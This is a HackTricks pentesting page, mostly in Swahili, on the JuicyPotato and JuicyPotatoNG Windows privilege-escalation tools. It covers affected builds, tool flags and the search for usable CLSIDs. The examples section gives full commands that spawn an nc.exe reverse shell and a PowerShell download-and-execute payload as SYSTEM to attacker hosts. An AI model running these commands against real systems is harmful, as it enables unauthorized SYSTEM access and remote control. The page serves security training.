# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato ni ya zamani. Kwa kawaida hufanya kazi kwenye matoleo ya Windows hadi Windows 10 1803 / Windows Server 2016. Mabadiliko ya Microsoft yaliyoanza kuwasilishwa kuanzia Windows 10 1809 / Server 2019 yalivunja mbinu ya asili. Kwa matoleo hayo na baadaye, fikiria mbadala za kisasa kama PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato na wengine. Angalia ukurasa hapa chini kwa chaguzi za kisasa na matumizi.

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (abusing the golden privileges) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Toleo lililoboreshwa la_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, na kuongeza kidogo, yaani **another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM**_

#### Unaweza kupakua juicypotato kutoka [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Vidokezo vya haraka vya utangamano

- Inafanya kazi kwa kuaminika hadi Windows 10 1803 na Windows Server 2016 wakati muktadha wa sasa una SeImpersonatePrivilege au SeAssignPrimaryTokenPrivilege.
- Imevunjika kwa sababu ya hatua za kuimarisha za Microsoft katika Windows 10 1809 / Windows Server 2019 na baadaye. Tumia mbadala zilizotajwa hapo juu kwa matoleo hayo.

### Muhtasari <a href="#summary" id="summary"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) na [variants](https://github.com/decoder-it/lonelypotato) inategemea privilege escalation chain iliyo msingi kwenye [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) kuwa na kipokezi cha MiTM kwenye `127.0.0.1:6666` na wakati una `SeImpersonate` au `SeAssignPrimaryToken` privileges. Wakati wa mapitio ya kujenga Windows tulipata usanidi ambapo `BITS` ilizimwa kwa kusudi na bandari `6666` ilikuwa imechukuliwa.

Tukaamua kuitumia kama silaha [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Say hello to Juicy Potato**.

> Kwa nadharia, angalia [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) na fuata mnyororo wa viungo na rejea.

Tuligundua kwamba, mbali na `BITS`, kuna seva kadhaa za COM tunazoweza kutumia vibaya. Zinahitaji tu:

1. kuwa zinazowezekana kuanzishwa na mtumiaji wa sasa, kawaida “service user” ambaye ana impersonation privileges
2. kutekeleza interface ya `IMarshal`
3. kuendesha kama mtumiaji aliye na haki za juu (SYSTEM, Administrator, …)

Baada ya majaribio kadhaa tulipata na kujaribu orodha kubwa ya [interesting CLSID’s](http://ohpe.it/juicy-potato/CLSID/) kwenye matoleo mbalimbali ya Windows.

### Maelezo ya kina <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato inakuwezesha:

- **Target CLSID** _chagua CLSID yoyote unayotaka._ [_Here_](http://ohpe.it/juicy-potato/CLSID/) _unaweza kupata orodha iliyopangwa kwa OS._
- **COM Listening port** _ainisha COM listening port unayopendelea (badala ya marshalled hardcoded 6666)_
- **COM Listening IP address** _fungua server kwa anwani yoyote ya IP_
- **Process creation mode** _kulingana na vibali vya mtumiaji aliyefanyiwa impersonation unaweza kuchagua kati ya:_
- `CreateProcessWithToken` (needs `SeImpersonate`)
- `CreateProcessAsUser` (needs `SeAssignPrimaryToken`)
- `both`
- **Process to launch** _anzisha executable au script ikiwa exploitation itafanikiwa_
- **Process Argument** _binafsisha hoja za mchakato unaoanzishwa_
- **RPC Server address** _kwa njia ya siri unaweza kuthibitisha kwenye RPC server ya nje_
- **RPC Server port** _inayofaa kama unataka kuthibitisha kwenye server ya nje na firewall inazuia port `135`…_
- **TEST mode** _hasa kwa madhumuni ya majaribio, yaani kujaribu CLSIDs. Inaunda DCOM na kuonyesha mtumiaji wa token. Tazama_ [_here for testing_](http://ohpe.it/juicy-potato/Test/)

### Usage <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Final thoughts <a href="#final-thoughts" id="final-thoughts"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

Ikiwa mtumiaji ana haki za `SeImpersonate` au `SeAssignPrimaryToken` basi wewe ni **SYSTEM**.

Karibu haiwezekani kuzuia matumizi mabaya ya COM Servers wote hawa. Unaweza kufikiria kubadilisha ruhusa za vitu hivi kupitia `DCOMCNFG` lakini bahati njema, hii itakuwa changamoto.

Suluhisho halisi ni kulinda akaunti nyeti na programu zinazofanya kazi chini ya akaunti za `* SERVICE`. Kuzuia `DCOM` kunaweza kuzuia kabisa exploit hii lakini kunaweza kuwa na athari kubwa kwa OS ya msingi.

From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## JuicyPotatoNG (2022+)

JuicyPotatoNG re-introduces a JuicyPotato-style local privilege escalation on modern Windows by combining:
- Urekebishaji wa DCOM OXID kwa server ya ndani ya RPC kwenye port iliyochaguliwa, ukiepuka listener ya zamani iliyokuwa hardcoded 127.0.0.1:6666.
- Hook ya SSPI ya kunasa na kufanya impersonate authentication ya SYSTEM inayokuja ndani bila kuhitaji RpcImpersonateClient, ambayo pia inawezesha CreateProcessAsUser wakati tu SeAssignPrimaryTokenPrivilege ipo.
- Mbinu za kuridhisha vizingiti vya activation vya DCOM (mfano, sharti la zamani la INTERACTIVE-group wakati unalenga madarasa ya PrintNotify / ActiveX Installer Service).

Vidokezo muhimu (tabia zinazoendelea katika builds):
- September 2022: Initial technique worked on supported Windows 10/11 and Server targets using the “INTERACTIVE trick”.
- January 2023 update from the authors: Microsoft later blocked the INTERACTIVE trick. A different CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) restores exploitation but only on Windows 11 / Server 2022 according to their post.

Basic usage (more flags in the help):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
If you’re targeting Windows 10 1809 / Server 2019 where classic JuicyPotato is patched, prefer the alternatives linked at the top (RoguePotato, PrintSpoofer, EfsPotato/GodPotato, etc.). NG may be situational depending on build and service state.

## Mifano

Kumbuka: Tembelea [this page](https://ohpe.it/juicy-potato/CLSID/) for a list of CLSIDs to try.

### Pata nc.exe reverse shell
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Anzisha CMD mpya (ikiwa una upatikanaji wa RDP)

![](<../../images/image (300).png>)

## Matatizo ya CLSID

Mara nyingi, CLSID ya chaguo-msingi ambayo JuicyPotato inatumia **haifanyi kazi** na exploit inashindwa. Kwa kawaida, inahitaji majaribio kadhaa ili kupata **CLSID inayofanya kazi**. Ili kupata orodha ya CLSIDs za kujaribu kwa mfumo wa uendeshaji maalum, tembelea ukurasa huu:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **Kukagua CLSIDs**

Kwanza, utahitaji baadhi ya executables mbali na juicypotato.exe.

Pakua [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) na uilete kwenye kikao chako cha PS, kisha pakua na uendeshe [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Skripti hiyo itaunda orodha ya CLSIDs zinazowezekana za kujaribu.

Kisha pakua [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(badilisha njia kwa orodha ya CLSID na kwa juicypotato executable) na uendeshe. Itaanza kujaribu kila CLSID, na **wanapobadilika nambari ya bandari, itamaanisha kuwa CLSID ilifanikiwa**.

**Angalia** CLSIDs zinazofanya kazi **ukitumia parameter -c**

## Marejeo

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)

{{#include ../../banners/hacktricks-training.md}}
